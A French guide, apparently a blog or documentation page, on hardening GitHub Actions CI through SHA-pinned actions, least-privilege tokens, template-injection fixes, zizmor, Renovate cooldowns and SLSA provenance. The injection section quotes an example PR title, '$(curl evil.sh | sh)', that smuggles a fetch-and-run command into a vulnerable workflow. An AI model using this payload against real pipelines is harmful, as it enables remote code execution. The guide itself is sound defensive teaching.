---
description: "Durcir une CI GitHub Actions : actions épinglées par SHA, permissions least-privilege, persist-credentials, runners nommés, injection de template, zizmor, actionlint, cooldown Renovate et Dependabot, provenance SLSA."
tags:
  - GitHub Actions
  - CI/CD
  - Security
  - Supply Chain
  - Renovate
---

# Durcir une CI GitHub Actions : pins, permissions, injections

Une CI lit le repo, détient des secrets, publie des artefacts et exécute du code que d'autres ont écrit. C'est la définition d'une cible. Tout ce qui suit tourne sur 2 repos publics, [gopen](https://github.com/PixiBixi/gopen) en Go et [uno-multiplayer](https://github.com/PixiBixi/uno-multiplayer) en Node et ne dépend d'aucun des 2 langages.

## Épingler les actions par SHA, pas par tag

Un tag Git est mutable. `uses: actions/checkout@v7` pointe vers ce que le mainteneur (ou quelqu'un qui a compromis son compte) décide d'y mettre. Le SHA d'un commit, lui, ne bouge pas.

```yaml
# Fragile : le tag peut être redéplacé sur du code malveillant
- uses: actions/checkout@v7

# Durci : le SHA est immuable, le commentaire garde la version lisible
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Le commentaire `# v7.0.1` n'est pas décoratif : [Renovate](https://docs.renovatebot.com/) comme Dependabot le lisent pour bumper le SHA **et** mettre à jour le commentaire, ce qui garde le pinning sans figer les actions dans le passé.

Ce qui se rate, c'est le pinning initial : on ajoute une action en `@v4` dans une PR et personne ne voit passer le tag. Le preset `helpers:pinGitHubActionDigests` et `pinDigests: true` demandent à Renovate de convertir en SHA tout ce qui traîne en tag, y compris les images de conteneurs référencées dans un step.

```json title="renovate.json"
{
  "extends": ["config:recommended", "helpers:pinGitHubActionDigests"],
  "pinDigests": true
}
```

Dependabot n'a pas d'équivalent et c'est une différence qui compte : il met à jour un SHA déjà écrit, mais il n'en pose jamais. Une action ajoutée en `@v4` y reste indéfiniment. C'est exactement comme ça que `uno-multiplayer` s'est retrouvé avec 12 actions non épinglées sans que personne l'ait décidé, alors que les 2 repos Go voisins étaient pinnés depuis leur premier commit.

Le pinning a par contre une limite qu'il vaut mieux connaître : il ne couvre que le premier niveau. Si `actions/checkout` référence lui-même une autre action par tag dans son `action.yml`, la résolution se fait au runtime et le SHA qu'on a écrit n'y change rien, donc quelqu'un qui compromet l'action imbriquée arrive quand même jusqu'au runner. GitHub a annoncé dans sa [roadmap sécurité Actions 2026](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) un bloc `dependencies:` dans le YAML du workflow, qui lockerait les dépendances directes **et** transitives par SHA avec vérification du hash avant exécution, dans l'esprit d'un `go.mod` + `go.sum`. En attendant, la seule vraie parade est de limiter le nombre d'actions tierces qu'on tire.

## Permissions au moindre privilège

Le `GITHUB_TOKEN` par défaut est trop permissif. On le réduit au strict nécessaire, par workflow et on descend au niveau du job quand un seul job a besoin d'un droit en écriture.

```yaml
# Aucun droit : le workflow zizmor n'écrit rien au niveau global...
permissions: {}

jobs:
  zizmor:
    permissions:
      security-events: write   # ...sauf ce job, pour publier dans l'onglet Security
```

L'échelle qu'on retrouve dans les repos :

| Besoin | `permissions` |
|--------|---------------|
| Lecture seule (test, lint, scan de vulnérabilités) | `contents: read` |
| Commenter/suggérer en PR (reviewdog) | `contents: read` + `pull-requests: write` |
| Publier une image | `contents: read` + `packages: write` |
| Rien au global, un droit scopé par job | `{}` puis override dans le job |

Le cas qui revient : un workflow de release qui déclare `contents: write` et `packages: write` au niveau global alors que 2 jobs distincts en ont besoin d'un chacun. Descendre les 2 dans leurs jobs respectifs et laisser `permissions: {}` en haut, c'est 4 lignes qui suppriment un job entier de la surface d'attaque.

## Couper les credentials sur le checkout

Par défaut, `actions/checkout` laisse le token traîner dans la config Git du runner. Un script de build compromis peut le récupérer et pousser sur le repo. On le désactive partout :

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false
```

La seule exception légitime, c'est un job qui pousse vraiment quelque chose depuis ce clone (un bump de version, un tag). Dans ce cas, on garde le credential et on l'écrit dans le workflow, avec la raison à côté, plutôt que de laisser le défaut décider à notre place.

## Épingler aussi le runner

`ubuntu-latest` est un tag mutable de plus, simplement pas hébergé sur GitHub Marketplace. GitHub le fait glisser d'une image à la suivante avec quelques semaines de préavis et le jour du basculement la CI change de version de bash, de Docker et de toolchains préinstallées sans qu'aucun commit ne le raconte.

```yaml
# Le contenu change sous nos pieds
runs-on: ubuntu-latest

# La version est explicite, son bump devient un commit
runs-on: ubuntu-24.04
```

On nomme la version que `-latest` désigne aujourd'hui, pas la plus récente qui existe : `ubuntu-26.04` est disponible mais en preview, alors que `ubuntu-latest` reste sur 24.04. Côté macOS c'est l'inverse du réflexe, `macos-latest` pointe déjà sur macOS 26, donc écrire `macos-15` downgraderait le runner sans le dire. Renovate suit ces labels via sa datasource `github-runners`, alimentée par le manager `github-actions` qui lit les workflows, donc le pin ne fige rien : il transforme juste une migration subie en PR qu'on relit. La nuance compte dans une `packageRule` : `github-runners` dans `matchManagers` ne matche rien et Renovate 44 l'accepte sans broncher, voir [valider une config Renovate](renovate-config.md).

## Injection de template : le `${{ }}` passe avant bash

C'est la vuln la plus facile à introduire et la plus dure à voir en relecture. `${{ }}` est une substitution textuelle faite **avant** que bash voie la ligne, donc tout ce qu'un contributeur contrôle arrive dans le script sans guillemets :

```yaml
# Vulnérable : le titre de la PR est collé tel quel dans le script
- run: echo "PR: ${{ github.event.pull_request.title }}"

# Durci : bash reçoit une variable, quel que soit son contenu
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR: $TITLE"
```

Une PR titrée `$(curl evil.sh | sh)` s'exécute donc dans le premier cas et bash n'a aucun moyen de savoir d'où vient la valeur. En passant par `env:`, le contenu reste une chaîne, quoi qu'il y ait dedans.

Ce qui est contrôlé de l'extérieur est plus large qu'on ne croit : titre et corps de PR, nom de branche, message de commit, label, nom d'auteur. Et les `inputs` d'un `workflow_dispatch`, qui sont du texte libre tapé dans un formulaire - c'est le cas qu'on trouve dans `uno-multiplayer`, où le tag à republier partait directement dans un `echo` :

```yaml
# Avant : le champ du formulaire est substitué dans la ligne
- run: echo "tag=${{ inputs.tag || needs.release.outputs.tag_name }}" >> "$GITHUB_OUTPUT"

# Après
- env:
    REQUESTED_TAG: ${{ inputs.tag || needs.release.outputs.tag_name }}
  run: echo "tag=${REQUESTED_TAG}" >> "$GITHUB_OUTPUT"
```

## zizmor et actionlint : tenir tout ça dans la durée

Les patterns ci-dessus, il faut les maintenir vrais sur des années et sur des workflows écrits par plusieurs personnes. [zizmor](https://github.com/zizmorcore/zizmor) audite les fichiers `.github/workflows/` et flague les tags non épinglés, les permissions trop larges, les injections de template, les credentials persistés. Un workflow qui s'auto-surveille :

```yaml title=".github/workflows/github-actions.yml"
name: github-actions

on:
  push:
    branches: [main, master]
  pull_request:

permissions: {}

jobs:
  zizmor:
    name: Run zizmor
    runs-on: ubuntu-24.04
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: zizmorcore/zizmor-action@3dc1ecc9bcb9e94e9b2c709687979e1298497054 # v0.6.2
```

!!! tip "Faire tourner zizmor en local"
    `uvx zizmor .github/workflows/` (ou `pipx run zizmor`) donne le même verdict avant de committer.

Quand un finding est un faux positif dans son contexte, on l'annote plutôt que de le désactiver globalement, avec la justification sur la ligne d'à côté :

```yaml
# Le credential est gardé exprès : cog commit et pousse le tag depuis ce clone.
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1 # zizmor: ignore[artipacked]
```

zizmor a un angle mort symétrique : il lit le workflow, pas le shell qu'il contient. [actionlint](https://github.com/rhysd/actionlint) complète en passant chaque bloc `run:` à shellcheck et en validant au passage les labels de runner, les `needs:` qui pointent vers un job inexistant et les expressions `${{ }}` mal typées. Son premier passage sur `gopen` a sorti un `goimports -w $(find . -name '*.go')` qui se casse au premier fichier contenant une espace, invisible depuis 6 mois parce que le repo n'a pas de fichier qui déclenche le cas.

## Automerger sans avaler une release compromise

L'automerge est le prolongement logique d'une CI en laquelle on a confiance : Renovate ouvre la PR, la CI passe, ça merge sans clic humain. On l'ouvre aux updates sûres (`minor`, `patch`, `digest`) et on garde les `major` en revue manuelle, seules à casser une API :

```json title="renovate.json"
{
  "matchUpdateTypes": ["minor", "patch", "digest"],
  "automerge": true,
  "automergeType": "pr"
}
```

`automergeType: pr` ouvre quand même une PR et attend les checks : l'automerge ne court-circuite pas la CI, il retire juste le clic une fois qu'elle est verte.

Reste un trou que la CI verte ne bouche pas : automerger une version publiée il y a 10 minutes, c'est exactement le scénario des compromissions npm de ces derniers mois, où le package vérolé passe les tests sans problème et reste en ligne quelques heures avant d'être yanké. `minimumReleaseAge` fait attendre Renovate :

```json title="renovate.json"
{
  "matchUpdateTypes": ["major", "minor", "patch", "digest"],
  "minimumReleaseAge": "5 days"
}
```

5 jours couvre à peu près la fenêtre pendant laquelle une release compromise se fait repérer. Le prix apparent, c'est un retard de 5 jours sur les patchs de sécurité, sauf que Renovate neutralise le cooldown dans sa config `vulnerabilityAlerts` (`minimumReleaseAge: null` par défaut) : les updates qui répondent à une CVE connue passent toujours tout de suite.

`digest` est le type qu'on oublie et c'est le plus intéressant des 4. Un update `digest` seul veut dire que la version n'a pas bougé mais que le SHA derrière le tag, si, donc que quelqu'un a redéplacé `v7` sur un autre commit. C'est précisément le scénario contre lequel on épingle et c'est aussi le type le plus automergé. Il a plus besoin du cooldown que les autres.

Les 2 règles ne se recouvrent pas : celle-ci ne pose que `minimumReleaseAge`, l'automerge reste défini par la règle précédente. Renovate applique les settings de chaque règle indépendamment, sans héritage de l'une vers l'autre, donc un `major` récupère le cooldown et rien d'autre - il attend toujours une revue.

Sur Dependabot, le même réglage se pose par écosystème et il existe déjà par défaut à 3 jours :

```yaml title=".github/dependabot.yml"
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 5
```

Même règle du jeu que chez Renovate : le cooldown ne s'applique qu'aux version updates, jamais aux security updates.

Le cran d'après, c'est de réserver l'automerge à une allow-list d'orgs de confiance (`actions/**`, `golang.org/x/**`, `k8s.io/**`) et de passer tout le reste en revue humaine. Sur un projet à 10 dépendances directes c'est disproportionné, mais ça devient l'arbitrage à faire dès que l'arbre grossit.

## Durcir au-delà des workflows

3 couches en plus, chacune à un fichier de workflow près.

- **[dependency-review-action](https://github.com/actions/dependency-review-action)** compare le graphe de dépendances avant et après la PR et bloque le merge si une CVE connue ou une licence non voulue **entre** dans l'arbre. Un scanner comme govulncheck dit si on appelle vraiment la fonction vulnérable ; dependency-review dit qu'elle arrive, ce qui est le bon moment pour discuter d'une dépendance qu'on n'a pas encore.

    ```yaml
    - uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
      with:
        fail-on-severity: high
        deny-licenses: GPL-2.0, GPL-3.0, AGPL-3.0
    ```

    `deny-licenses` est le réglage qu'on oublie alors qu'il coûte une ligne. Une dépendance copyleft qui entre dans un projet sous licence permissive est un problème juridique, pas un problème de style, et c'est en PR qu'on veut l'apprendre plutôt qu'au moment de publier.

- **[OpenSSF Scorecard](https://securityscorecards.dev/)** note le repo sur une vingtaine de checks et publie le résultat dans l'onglet Security. Son intérêt est de regarder ce qui n'est pas dans les workflows : protection de branche, présence d'une politique de sécurité, signature des releases, activité de maintenance. Un audit qui tourne tout seul plutôt qu'une relecture annuelle.

- **[CodeQL](https://codeql.github.com/)** analyse le code du repo lui-même, là où govulncheck et dependency-review ne regardent que les dépendances. Sur du Go, la mise en place tient en un workflow et il se fait tourner en local avant d'être poussé, ce qui évite de découvrir ses alertes une par une en CI : voir [CI GitHub Actions pour un projet Go](go-ci.md#codeql-analyser-son-propre-code).

- **[harden-runner](https://github.com/step-security/harden-runner)** filtre le trafic sortant du runner. On le pose d'abord en `audit` pour voir ce que la CI contacte réellement, puis en `block` avec une allow-list. C'est ce mécanisme qui a permis de repérer la compromission de `tj-actions/changed-files` en 2025 : les runners exfiltraient vers un endpoint qui n'avait rien à faire là et l'anomalie est sortie dans les rapports d'egress avant que qui que ce soit lise le diff de l'action.

GitHub prépare son propre pare-feu d'egress natif, décrit dans la roadmap 2026, qui tournerait hors de la VM du runner et resterait donc actif même si un attaquant y obtient root.

## Attester comment l'artefact a été construit

Une signature dit **qui** a publié. Elle ne dit pas depuis quel repo, quel commit, ni quel workflow et c'est précisément ce qu'un attaquant qui obtient un job de release voudrait maquiller. La provenance SLSA enregistre tout ça dans une attestation signée par l'OIDC GitHub, donc un job compromis ne peut pas en produire une qui prétende venir d'un autre workflow.

Ça tient en un step et 2 permissions, quel que soit ce qu'on publie :

```yaml
permissions:
  id-token: write      # identité keyless qui signe l'attestation
  attestations: write  # écrire l'attestation sur le repo

      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-path: 'dist/*.tar.gz,dist/checksums.txt'
```

Pour une image OCI, la provenance s'attache au digest et pas à un fichier et `push-to-registry` la publie à côté du manifest pour qu'un consommateur la trouve sans passer par la release GitHub :

```yaml
      - uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
        id: build
        # ...

      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-name: ghcr.io/monorg/mon-image
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
```

Le piège du `subject-name` : il doit être en minuscules. `metadata-action` minuscule le nom de l'image toute seule pour ses tags, l'attestation non et GHCR refuse les majuscules - donc un repo dont l'owner a une capitale casse ici et nulle part ailleurs.

La vérification côté utilisateur tient en une commande, sans avoir à connaître l'identité du certificat comme pour `cosign verify` :

```bash
gh attestation verify ./mon-binaire_linux_amd64.tar.gz --repo monorg/mon-repo
gh attestation verify oci://ghcr.io/monorg/mon-image:vX.Y.Z --repo monorg/mon-repo
```

## Rendre les releases immuables

Une fois la release publiée, GitHub sait interdire de redéplacer son tag et de remplacer ses assets : c'est le toggle *Immutable releases* dans les settings du repo. Une case à cocher et elle ferme le scénario où un compte compromis republie un binaire sous un tag déjà installé partout.

Le pendant côté artefacts, c'est la signature : la provenance dit d'où vient le binaire, cosign dit qui l'a publié. Sa configuration dans un pipeline GoReleaser est dans [l'article dédié](goreleaser.md).

## Récap

- Actions épinglées par SHA, versions gardées lisibles en commentaire
- `pinDigests` pour que la prochaine action ajoutée le soit aussi
- `permissions:` au moindre privilège, `{}` au global et opt-in par job
- `persist-credentials: false` sur chaque checkout, sauf celui qui pousse vraiment
- Runners nommés et tout outil installé dans un `run:` en version épinglée
- Aucun `${{ }}` dans un bloc `run:`, tout passe par `env:`
- zizmor et actionlint en CI pour que ça reste vrai
- Automerge derrière un cooldown de 5 jours, `digest` compris
- Provenance SLSA sur ce qu'on publie, releases immuables une fois publiées

!!! tip "Le pendant applicatif"
    Le durcissement des workflows ne dit rien de ce qui est testé dedans. Pour une CI Go complète (matrice multi-OS, golangci-lint, govulncheck, release pilotée par les commits), voir [CI GitHub Actions pour un projet Go](go-ci.md).
